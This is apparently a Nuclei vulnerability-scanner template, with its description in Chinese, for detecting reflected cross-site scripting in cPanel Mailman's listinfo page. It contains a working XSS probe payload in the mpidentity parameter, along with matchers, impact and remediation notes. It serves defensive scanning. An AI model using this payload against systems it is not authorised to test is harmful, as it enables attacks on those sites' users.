id: cpanel-mailman-xss

info:
  name: cPanel Mailman - 跨站脚本漏洞
  author: yshahinzadeh,amirmsafari
  severity: medium
  description: |
    该模板用于检测 cPanel Mailman - 跨站脚本漏洞。该类漏洞通常源于页面未对用户输入进行正确过滤或输出编码，导致脚本内容被浏览器执行。模板主要向 `/mailman/listinfo?mpidentity=%3C/script%3E%3Csvg/onload=alert(document.domain)%3E` 等路径发送探测请求，并根据响应中的 `</script><svg/onload=alert(document.domain)>`、`mailman` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可诱导用户访问构造链接或页面，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、执行越权操作、篡改页面内容，或作为钓鱼和横向攻击链的一环。
  remediation: |
    - 对所有反射或存储到页面的用户输入进行上下文相关输出编码。
    - 对富文本、URL、HTML 属性等高风险输入使用白名单过滤，并启用合适的 Content-Security-Policy。
    - 升级受影响组件，检查是否存在被植入的恶意脚本或异常后台操作。
  reference:
    - https://blog.voorivex.team/two-cpanel-zero-day-vulnerabilities
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cwe-id: CWE-80
  metadata:
    verified: true
    max-request: 1
  tags: xss,cpanel,mailman,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/mailman/listinfo?mpidentity=%3C/script%3E%3Csvg/onload=alert(document.domain)%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "</script><svg/onload=alert(document.domain)>"
          - "mailman"
          - "gnu-head-tiny"
        condition: and

      - type: status
        status:
          - 200
